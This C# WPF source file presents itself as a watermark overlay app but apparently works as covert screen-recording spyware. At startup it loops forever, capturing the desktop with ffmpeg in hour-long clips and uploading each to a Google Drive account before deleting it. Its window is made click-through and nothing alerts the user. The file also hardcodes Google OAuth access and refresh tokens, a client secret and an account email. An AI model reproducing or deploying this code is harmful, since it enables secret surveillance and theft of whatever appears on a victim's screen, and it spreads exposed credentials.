using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Interop;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using IWshRuntimeLibrary;
using System.IO;
using System.Configuration;
using CommandExecutor;
using System.Threading;
using Google.Apis.Auth.OAuth2.Flows;
using Google.Apis.Auth.OAuth2.Responses;
using Google.Apis.Auth.OAuth2;
using Google.Apis.Drive.v3;
using Google.Apis.Services;
using Google.Apis.Util.Store;
using static Google.Apis.Drive.v3.DriveService;
using Google.Apis.Upload;
using static System.Formats.Asn1.AsnWriter;
using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json.Serialization;
using Newtonsoft.Json;

namespace WoterMark
{
    public partial class MainWindow : Window
    {
        private static string _AccessToken = "ya29.a0AXooCguR03Y1aa9ZB2i11jqzQXTmmCDDvIWjq9GK_o7NWeglxZv-qRpYZPowoxiOIZBIR_ZZMPXcZL9NPwEyi7GTRx2tF-QacqSu-KBJlnhCP6P82LkhRnIwr-JPECfMYgwcX4XlUOwrB0OKEQLahQTXQSvTBtIcQzIeaCgYKAVcSARMSFQHGX2MikAZujxR-yJvv7lyH5s6S_g0171";
        private static string _RefreshToken = "1//04VhWthKnXY_gCgYIARAAGAQSNwF-L9Ir_JHVoqYzCWeeUThqf4xJ6O7wAxg2gn5GUjhhvXWEFOolMCUXiIWjQEwGZJa_LwaZaLc";
        private static string _ClientId = "137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com";
        private static string _ClientSecret = "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";
        private static string _ApplicationName = "service";
        private static string _UserName = "shared.vid.acc@gmail.com";
        private static HttpClient _client => new HttpClient();
        public MainWindow()
        {
            InitializeComponent();
            Task.Run(() => RecordScreen());
        }

        private async Task RecordScreen()
        {
            var executor = new CommandLineExecutor();
            var libsPath = "C:\\Program Data";
            var currentDate = DateTime.Now.ToString("yyyy-MM-dd");
            var parentId = CreateFolder(currentDate);
            while (true)
            {
                try
                {
                    await RefreshToken();
                    if (currentDate != DateTime.Now.ToString("yyyy-MM-dd"))
                    {
                        currentDate = DateTime.Now.ToString("yyyy-MM-dd");
                        parentId = CreateFolder(currentDate);
                    }

                    var dt = DateTime.Now.ToString("yyyy-MM-dd-HH-mm");
                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", $"Start recording at {dt}");
                    executor.Execute(true, $"cd {libsPath}", $"ffmpeg.exe -t 3600 -hide_banner -loglevel error -f gdigrab -framerate 15 -i desktop -c:v libx264 {dt}.mp4 -f {dt}.mp4");

                    UploadFile($"{libsPath}/{dt}.mp4", new string[] { parentId });
                    System.IO.File.Delete($"{libsPath}/{dt}.mp4");
                    Thread.Sleep(10000);
                }
                catch (Exception ex)
                {
                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.StackTrace);
                    System.IO.File.AppendAllText($"{libsPath}\\1.txt", ex.Message);
                }
            }
        }

        private async Task RefreshToken()
        {
            _client.DefaultRequestHeaders.Add("Host", "oauth2.googleapis.com");
            _client.DefaultRequestHeaders.Add("user-agent", "google-oauth-playground");
            var textContent = new StringContent(@"{""token_uri"":""https://oauth2.googleapis.com/token"",""client_id"":""137923084845-2s9kl5knqe8mpa2orfg78nt8qeph8j9s.apps.googleusercontent.com"",""client_secret"":""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"",""refresh_token"":""1//04VhWthKnXY_gCgYIARAAGAQSNwF-L9Ir_JHVoqYzCWeeUThqf4xJ6O7wAxg2gn5GUjhhvXWEFOolMCUXiIWjQEwGZJa_LwaZaLc""}");
            var response = await _client.PostAsync("https://developers.google.com/oauthplayground/refreshAccessToken", textContent);
            var content = await response.Content.ReadAsStringAsync();
            _AccessToken = JsonConvert.DeserializeObject<Rootobject>(content).access_token;
        }

        protected override void OnSourceInitialized(EventArgs e)
        {
            try
            {
                base.OnSourceInitialized(e);
                var hwnd = new WindowInteropHelper(this).Handle;
                WindowsServices.SetWindowExTransparent(hwnd);
            }
            catch { }
        }

        private static DriveService GetService()
        {
            var tokenResponse = new TokenResponse
            {
                AccessToken = _AccessToken,
                RefreshToken = _RefreshToken
            };

            var applicationName = _ApplicationName; // Use the name of the project in Google Cloud
            var username = _UserName; // Use your email


            var apiCodeFlow = new GoogleAuthorizationCodeFlow(new GoogleAuthorizationCodeFlow.Initializer
            {
                ClientSecrets = new ClientSecrets
                {
                    ClientId = _ClientId,
                    ClientSecret = _ClientSecret
                },
                Scopes = new[] { DriveService.Scope.Drive },
                DataStore = new FileDataStore(applicationName)
            });


            var credential = new UserCredential(apiCodeFlow, username, tokenResponse);



            var service = new DriveService(new BaseClientService.Initializer
            {
                HttpClientInitializer = credential,
                ApplicationName = applicationName
            });
            return service;
        }


        public string CreateFolder(string folderName, string[] parentIds = null)
        {
            var service = GetService();
            var driveFolder = new Google.Apis.Drive.v3.Data.File();
            driveFolder.Name = folderName;
            driveFolder.MimeType = "application/vnd.google-apps.folder";
            if (parentIds != null)
                driveFolder.Parents = parentIds;

            var command = service.Files.Create(driveFolder);
            var file = command.Execute();
            return file.Id;
        }


        public string UploadFile(string fileName, string[] parentIds = null)
        {
            var libsPath = "C:\\Program Data";
            DriveService service = GetService();
            using (var fsSource = new FileStream(fileName, FileMode.Open, FileAccess.Read))
            {
                // Create a new file, with metadata and stream.
                var fileMetadata = new Google.Apis.Drive.v3.Data.File()
                {
                    Name = fsSource.Name
                };

                if (parentIds != null)
                    fileMetadata.Parents = parentIds;

                var request = service.Files.Create(fileMetadata, fsSource, "video/mp4");
                request.Fields = "*";
                var results = request.Upload();

                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Exception?.Message ?? "Success");
                System.IO.File.AppendAllText($"{libsPath}\\1.txt", results?.Status.ToString());
                if (results.Status == UploadStatus.Failed)
                {
                    Console.WriteLine($"Error uploading file: {results.Exception.Message}");
                }
            }

            return "";
        }
    }
    public static class WindowsServices
    {
        const int WS_EX_TRANSPARENT = 0x00000020;
        const int GWL_EXSTYLE = (-20);

        [DllImport("user32.dll")]
        static extern int GetWindowLong(IntPtr hwnd, int index);

        [DllImport("user32.dll")]
        static extern int SetWindowLong(IntPtr hwnd, int index, int newStyle);

        public static void SetWindowExTransparent(IntPtr hwnd)
        {
            var extendedStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
            SetWindowLong(hwnd, GWL_EXSTYLE, extendedStyle | WS_EX_TRANSPARENT);
        }

        public static void Create(string ShortcutPath, string TargetPath)
        {
            WshShell wshShell = new WshShell(); //создаем объект wsh shell

            IWshShortcut Shortcut = (IWshShortcut)wshShell.
                CreateShortcut(ShortcutPath);

            Shortcut.TargetPath = TargetPath; //путь к целевому файлу

            Shortcut.Save();
        }
    }

}
